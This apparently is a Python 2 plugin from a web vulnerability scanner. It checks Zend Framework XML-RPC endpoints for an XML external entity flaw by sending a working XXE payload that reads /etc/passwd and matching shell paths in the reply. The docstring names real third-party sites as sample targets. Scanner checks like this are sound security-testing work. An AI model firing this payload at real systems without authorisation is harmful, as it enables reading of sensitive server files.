#!/usr/bin/python
#-*-encoding:UTF-8-*-
from lib.common import *

def run_domain(http,ob):
    '''
http://www.mymetasys.com.br/index.php/api/xmlrpc
https://we101.infusionsoft.com/api/xmlrpc

    '''
    list = []
    try:
        domain = ob['domain']
        detail = ""
    
        url = "%s://%s%s" % (ob['scheme'],ob['domain'],ob['base_path'])
        expurl="%s%s"%(url,"index.php/api/xmlrpc")
        expurl1="%s%s"%(url,"api/xmlrpc")
        
        data="<?xml version=\"1.0\"?><!DOCTYPE foo [<!ELEMENT methodName ANY ><!ENTITY xxe SYSTEM \"file:///etc/passwd\" >]><methodCall><methodName>&xxe;</methodName></methodCall>"
        headers={}

        #res, content = http.request(expurl,"POST",data,headers)
        res, content = yx_httplib2_request(http,expurl,"POST",data,headers)
        #print content
        if re.search('/bin/(bash|sh)[^\r\n<>]*[\r\n]', content):
            
            #print ">>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>"
            request = postRequest(expurl,"POST",headers,data)
            response = getResponse(res)
            list.append(getRecord(ob,ob['scheme']+"://"+ob['domain'],ob['level'],detail,request,response))
        else:
            #res, content = http.request(expurl1,"POST",data,headers)
            res, content = yx_httplib2_request(http,expurl1,"POST",data,headers)
            if re.search('/bin/(bash|sh)[^\r\n<>]*[\r\n]', content):
                request = postRequest(expurl,"POST",headers,data)
                response = getResponse(res)
                list.append(getRecord(ob,ob['scheme']+"://"+ob['domain'],ob['level'],detail,request,response))
    except Exception,e:
        logging.getLogger().error("File:zendframwordreadfile.py, run_domain function :" + str(e) + ",task id:" + ob['task_id'] + ",domain id:" + ob['domain_id'])
        write_scan_log(ob['task_id'],ob['domain_id'],"File:zendframwordreadfile.py, run_domain function :" + str(e))
    #end try
    
    return list
#end def